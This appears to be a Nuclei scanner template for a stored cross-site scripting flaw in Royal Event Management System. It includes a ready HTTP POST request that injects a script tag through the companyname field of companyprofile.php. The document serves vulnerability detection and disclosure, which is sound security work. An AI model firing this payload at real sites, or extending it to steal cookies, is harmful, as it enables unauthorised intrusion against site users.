# Nuclei Template: Royal Event Management System - Stored Cross-Site Scripting
**Template ID:** royalevent-stored-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`royalevent-stored-xss.yaml`)

## Vulnerability Information & PoC

## Description
Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
POST /royal_event/companyprofile.php HTTP/1.1
Host: {{Hostname}}

companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=
```

## References
- https://packetstormsecurity.com/files/166479/Royale-Event-Management-System-1.0-Cross-Site-Scripting.html
- https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip
